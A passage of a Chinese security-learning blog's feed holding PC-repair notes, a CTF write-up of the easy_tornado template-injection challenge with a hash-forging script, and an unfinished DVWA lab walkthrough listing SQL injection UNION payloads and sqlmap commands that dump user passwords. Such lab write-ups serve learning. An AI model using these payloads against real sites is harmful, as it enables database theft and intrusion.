            <tag> ctf-web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>修电脑记录</title>
      <link href="2020/03/20/%E4%BF%AE%E7%94%B5%E8%84%91%E8%AE%B0%E5%BD%95/"/>
      <url>2020/03/20/%E4%BF%AE%E7%94%B5%E8%84%91%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>好多次帮同学解决电脑了，后来想想不如把这个经历写成一个文档，自己翻或者直接把文档给同学也方便</p><span id="more"></span><h2 id="2020-3-20"><a href="#2020-3-20" class="headerlink" title="2020/3/20"></a>2020/3/20</h2><p>帮同学修电脑，wifi能连接但是上不了网，ie回显报错是dns服务器的问题但是经过排查，发现dns服务没有问题。尝试ping命令发现能ping通百度，但是浏览器和用到网络资源的软件都没办法上网。于是考虑是网络接口系统文件的问题。经过百度，了解了一下netsh winsock reset命令，成功解决这一问题。</p><h3 id="netsh-winsock-reset"><a href="#netsh-winsock-reset" class="headerlink" title="netsh winsock  reset"></a>netsh winsock  reset</h3><p>netsh winsock reset命令，作用是重置 Winsock 目录。如果一台机器上的Winsock协议配置有问题的话将会导致网络连接等问题，就需要用netsh winsock reset命令来重置Winsock目录借以恢复网络。这个命令可以重新初始化网络环境，以解决由于软件冲突、病毒原因造成的参数错误问题。 netsh是一个能够通过命令行操作几乎所有网络相关设置的接口，比如设置IP，DNS，网卡，无线网络等，Winsock是系统内部目录，Winsock是Windows网络编程接口，winsock工作在应用层，它提供与底层传输协议无关的高层数据传输编程接口，reset是对Winsock的重置操作。当执行完winsock的命令重启计算机后，需要重新配置IP。</p><h3 id="能解决的电脑问题"><a href="#能解决的电脑问题" class="headerlink" title="能解决的电脑问题"></a>能解决的电脑问题</h3><p>安装广告软件，间谍软件，VPN或防火墙后无法联网。<br>无法访问任何网页或只能访问某些网页。<br>出现与网络相关问题的弹出错误窗口。<br>由于注册表错误，没有网络连接。<br>发生DNS查找问题。无法续订网络适配器的IP地址或其他一些DHCP错误。没有连接消息的网络连接问题。</p><h2 id="2020-5-14补充"><a href="#2020-5-14补充" class="headerlink" title="2020/5/14补充"></a>2020/5/14补充</h2><p>电脑遇上了dns解析的问题而无法上网<br>cmd中使用 ipconfig/flushdns 清理一下dns缓存就好了</p><h2 id="2021-1-8-git遇上了些小问题"><a href="#2021-1-8-git遇上了些小问题" class="headerlink" title="2021/1/8  git遇上了些小问题"></a>2021/1/8  git遇上了些小问题</h2><p>本地推送代码带Git仓库失败,报错Logon failed, use ctrl+c to cancel basic credential prompt.</p><p>推送的时候弹出githup的登陆框,账号密码正确但是提示不正确</p><p>解决方法:在网页上登陆你自己的githup账号,点击右上角头像–&gt; setting –&gt; Developer settings –&gt; Personal access tokens页面</p><p>新建完成,页面已经有一个新的token,这个页面先不要动,或者先复制出来,页面刷新后这个token就看不见了</p><p>回到git bash 继续提交,在githup登陆弹出框中输入账号密码,第一次输入的是你githup的账号密码,第二次弹出后输入git账号,密码换成刚刚生成的token.</p><p>如果两次错误,会提示你在git bash中输入账号,之后会弹出一个密码框,这个也是输入token</p><p>总之,账号还是输入你自己的git账号,密码,第二次之后输入token</p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 电脑常识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[护网杯]easy_tornado</title>
      <link href="2020/03/09/%E6%8A%A4%E7%BD%91%E6%9D%AF-easy-tornado/"/>
      <url>2020/03/09/%E6%8A%A4%E7%BD%91%E6%9D%AF-easy-tornado/</url>
      
        <content type="html"><![CDATA[<p>服务端模板注入也是一种注入攻击（简称为SSTL）<br>这又涉及到了本人的知识盲区<br>借这个题学习补充一下知识</p><span id="more"></span><h1 id="自己走过的路加wp辅助"><a href="#自己走过的路加wp辅助" class="headerlink" title="自己走过的路加wp辅助"></a>自己走过的路加wp辅助</h1><h2 id="信息收集加思路推理"><a href="#信息收集加思路推理" class="headerlink" title="信息收集加思路推理"></a>信息收集加思路推理</h2><p><img src="https://img-blog.csdnimg.cn/20200301114116845.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200301114116845.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述">点击一下/welcome.txt<br>回显 render<br>而且url处有异常<br><img src="https://img-blog.csdnimg.cn/20200301114219784.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200301114219784.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述">同理测试其他选项<br><img src="https://img-blog.csdnimg.cn/20200301114412197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200301114412197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20200301114423677.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200301114423677.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述">通过猜测可知filehash的值就是/hint.txt中的算法得到的<br>从而<br>我们只要得到cookie_secret的值即可通过脚本的到于/fllllllllllllag对应的filename的值</p><h2 id="模板注入拿到cookie-secret"><a href="#模板注入拿到cookie-secret" class="headerlink" title="模板注入拿到cookie_secret"></a>模板注入拿到cookie_secret</h2><p>get传参</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=/fllllllllllllag&amp;filehash=</span><br></pre></td></tr></table></figure><p>回显<br><img src="https://img-blog.csdnimg.cn/20200301115108327.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200301115108327.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述">发现可疑参数msg<br>结合上面提示render<br>进行测试<br>msg=1<br>发现有回显，存在漏洞<br>查找大佬的wp得知(<a href="https://darkwing.moe/2019/10/30/%E6%8A%A4%E7%BD%91%E6%9D%AF2018-easy-tornado/">来源，非常感谢大佬</a>)<br>在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量<br>于是访问如下参数<br><img src="https://img-blog.csdnimg.cn/202003011155549.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/202003011155549.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述">拿到了cookie_secret</p><h2 id="小小的脚本"><a href="#小小的脚本" class="headerlink" title="小小的脚本"></a>小小的脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;/fllllllllllllag&#x27;</span></span><br><span class="line">cookie_secret = <span class="string">&#x27;7012f546-ae20-45cb-8b05-19bf1e96d0bf&#x27;</span></span><br><span class="line">file_md5 = hashlib.md5(filename.encode(encoding=<span class="string">&#x27;UTF-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(hashlib.md5((cookie_secret+file_md5).encode(encoding=<span class="string">&quot;UTF-8&quot;</span>)).hexdigest())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>访问拿到flag<br><img src="https://img-blog.csdnimg.cn/20200301115943217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200301115943217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"></p><h1 id="知识点总结（参考各种大佬的文章，非原创）"><a href="#知识点总结（参考各种大佬的文章，非原创）" class="headerlink" title="知识点总结（参考各种大佬的文章，非原创）"></a>知识点总结（参考各种大佬的文章，非原创）</h1><h2 id="1-模板渲染"><a href="#1-模板渲染" class="headerlink" title="1.模板渲染"></a>1.模板渲染</h2><p><a href="https://segmentfault.com/a/1190000016704384">参考senntyou师傅的文章</a><br>前端与后端最初的渲染方式是后端模板渲染，就是由后端使用模板引擎渲染好 html 后，返回给前端，前端再用 js 去操作 dom 或者渲染其他动态的部分。<br><img src="https://img-blog.csdnimg.cn/20200301121541671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200301121541671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"><br>前端请求一个地址 url<br>后端接收到这个请求，然后根据请求信息，从数据库或者其他地方获取相应的数据<br>使用模板引擎（如 java &gt; jsp、php &gt; smarty）将这些数据渲染成 html<br>将 html 文本返回给前端</p><p>个人觉得就是后端模板引擎对数据的一种处理成html的方式</p><p>关于tornado模板的介绍</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line">   <span class="string">&lt;head&gt;</span></span><br><span class="line">      <span class="string">&lt;title&gt;&#123;&#123;</span> <span class="string">title</span> <span class="string">&#125;&#125;&lt;/title&gt;</span></span><br><span class="line">   <span class="string">&lt;/head&gt;</span></span><br><span class="line">   <span class="string">&lt;body&gt;</span></span><br><span class="line">     <span class="string">&lt;ul&gt;</span></span><br><span class="line">       &#123;<span class="string">%</span> <span class="string">for</span> <span class="string">item</span> <span class="string">in</span> <span class="string">items</span> <span class="string">%</span>&#125;</span><br><span class="line">         <span class="string">&lt;li&gt;&#123;&#123;</span> <span class="string">escape(item)</span> <span class="string">&#125;&#125;&lt;/li&gt;</span></span><br><span class="line">       &#123;<span class="string">%</span> <span class="string">end</span> <span class="string">%</span>&#125;</span><br><span class="line">     <span class="string">&lt;/ul&gt;</span></span><br><span class="line">   <span class="string">&lt;/body&gt;</span></span><br><span class="line"> <span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p>渲染代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        items = [<span class="string">&quot;Item 1&quot;</span>, <span class="string">&quot;Item 2&quot;</span>, <span class="string">&quot;Item 3&quot;</span>]</span><br><span class="line">        self.render(<span class="string">&quot;template.html&quot;</span>, title=<span class="string">&quot;My title&quot;</span>, items=items)</span><br></pre></td></tr></table></figure><p>在引擎下, Tornado模板被直接转换为Python. 包含在你模板中的表达式会 逐字的复制到一个代表你模板的Python函数中.</p><h2 id="2-SSTl攻击"><a href="#2-SSTl攻击" class="headerlink" title="2.SSTl攻击"></a>2.SSTl攻击</h2><p>先推荐一个大佬在黑客大会发的东西<br><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf">https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf</a><br>就引用一下<a href="https://blog.knownsec.com/2015/11/server-side-template-injection-attack-analysis/">niubl大佬的文章</a>`<br>以Twig为例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/../lib/Twig/Autoloader.php&#x27;</span>;</span><br><span class="line">Twig_Autoloader::register(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$twig</span> = <span class="keyword">new</span> Twig_Environment(<span class="keyword">new</span> Twig_Loader_String());</span><br><span class="line"><span class="variable">$output</span> = <span class="variable">$twig</span>-&gt;render(<span class="string">&quot;Hello &#123;&#123;name&#125;&#125;&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;name&quot;</span> =&gt; <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>]));  <span class="comment">// 将用户输入作为模版变量的值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用 Twig 模版引擎渲染页面，其中模版含有   变量，其模版变量值来自于 GET 请求参数 $_GET[“name”] 。<br>但是，如果渲染的模版内容受到用户的控制，情况就不一样了。修改代码为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/../lib/Twig/Autoloader.php&#x27;</span>;</span><br><span class="line">Twig_Autoloader::register(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$twig</span> = <span class="keyword">new</span> Twig_Environment(<span class="keyword">new</span> Twig_Loader_String());</span><br><span class="line"><span class="variable">$output</span> = <span class="variable">$twig</span>-&gt;render(<span class="string">&quot;Hello <span class="subst">&#123;$_GET[&#x27;name&#x27;]&#125;</span>&quot;</span>);  <span class="comment">// 将用户输入作为模版内容的一部分</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>;</span><br></pre></td></tr></table></figure><p>上面这段代码在构建模版时，拼接了用户输入作为模板的内容，现在如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出<br>注入攻击的真谛：永远不要相信用户的输入</p><h2 id="3-python3的md5-方法使用"><a href="#3-python3的md5-方法使用" class="headerlink" title="3.python3的md5()方法使用"></a>3.python3的md5()方法使用</h2><p>在python3的标准库中，已经移除了md5，而关于hash加密算法都放在hashlib这个标准库中，如SHA1、SHA224、SHA256、SHA384、SHA512和MD5算法等<br>hexdigest()在英语中hex有十六进制的意思，因此该方法是将hash中的数据转换成数据，其中只包含十六进制的数字。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 或者可以这样（最常见的写法，常用于图片的命名）</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hashlib.md5(<span class="string">b&#x27;123&#x27;</span>).hexdigest()</span><br><span class="line"><span class="string">&#x27;202cb962ac59075b964b07152d234b70&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 也可以使用hash.new()这个一般方法，hashlib.new(name[, data])，name传入的是哈希加密算法的名称，如md5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hashlib.new(<span class="string">&#x27;md5&#x27;</span>, <span class="string">b&#x27;123&#x27;</span>).hexdigest()</span><br><span class="line"><span class="string">&#x27;202cb962ac59075b964b07152d234b70&#x27;</span></span><br></pre></td></tr></table></figure><p>对中文进行加密时</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>data = <span class="string">&#x27;你好&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hashlib.md5(data.encode(encoding=<span class="string">&#x27;UTF-8&#x27;</span>)).hexdigest()</span><br><span class="line"><span class="string">&#x27;7eca689f0d3389d9dea66ae112e5cfd7&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dvwa-sqli+sqlmap使用</title>
      <link href="2020/03/09/dvwa-sqli-sqlmap%E4%BD%BF%E7%94%A8/"/>
      <url>2020/03/09/dvwa-sqli-sqlmap%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>最近学了一下sqlmap的使用方式发现挺简单的，但是也要尝试练一练呀，想起了最初搭建的dvwa。。。（玩一波~~~）</p><span id="more"></span><h1 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h1><h2 id="level-low"><a href="#level-low" class="headerlink" title="level low"></a>level low</h2><p><strong>手注</strong><br>low这个等级真的没啥好说的<br>最简单的union查询<br>列一下payload流程吧</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 2# 测试列数</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span># 测试回显位置</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,database()# 查看数据库名</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;dvwa&#x27;</span># 查表</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;#查列</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,concat_ws(<span class="string">&#x27;~&#x27;</span>,<span class="keyword">user</span>,password) <span class="keyword">from</span> users#查字段</span><br></pre></td></tr></table></figure><p><strong>sqlmap</strong><br>查看 dbms 当前数据库 和当前用户</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py <span class="literal">-u</span><span class="string">&quot;http://dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</span> <span class="literal">-cookie</span>=<span class="string">&quot;PHPSESSID=08ic1cp9rcho2g1pol3qd9rcpt;security=low&quot;</span> <span class="literal">-b</span> <span class="literal">-current</span><span class="literal">-db</span> <span class="literal">-current</span><span class="literal">-user</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200331220936428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200331220936428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"><br>查看 当前数据库中的表名</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py <span class="literal">-u</span><span class="string">&quot;http://dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</span> <span class="literal">-cookie</span>=<span class="string">&quot;PHPSESSID=08ic1cp9rcho2g1pol3qd9rcpt;security=low&quot;</span> <span class="literal">-D</span> dvwa -<span class="literal">-tables</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200331221023246.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200331221023246.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"><br>查看表中的列名</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py <span class="literal">-u</span><span class="string">&quot;http://dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</span> <span class="literal">-cookie</span>=<span class="string">&quot;PHPSESSID=08ic1cp9rcho2g1pol3qd9rcpt;security=low&quot;</span> <span class="literal">-D</span> dvwa <span class="literal">-T</span> users -<span class="literal">-columns</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200331221121853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200331221121853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"><br>查看字段并停止查询</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py <span class="literal">-u</span><span class="string">&quot;http://dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</span> <span class="literal">-cookie</span>=<span class="string">&quot;PHPSESSID=08ic1cp9rcho2g1pol3qd9rcpt;security=low&quot;</span> <span class="literal">-D</span> dvwa <span class="literal">-T</span> users <span class="literal">-C</span> user,password -<span class="literal">-dump</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200331221223312.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200331221223312.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"><br>发现sqlmap还能生成临时文件并制作爆破字典真是一款强大的工具</p><h2 id="level-medium"><a href="#level-medium" class="headerlink" title="level medium"></a>level medium</h2><p><strong>手注</strong></p><p><img src="https://img-blog.csdnimg.cn/20200331221454995.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200331221454995.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"><br>画风突转变成了POST的方式，不过也没啥东西，用burp抓个包就绕过去了<br><img src="https://img-blog.csdnimg.cn/20200331221616351.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200331221616351.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"><br>分析分析一波源代码看看过滤了什么<br><img src="https://img-blog.csdnimg.cn/20200331221723946.png" class="lazyload" 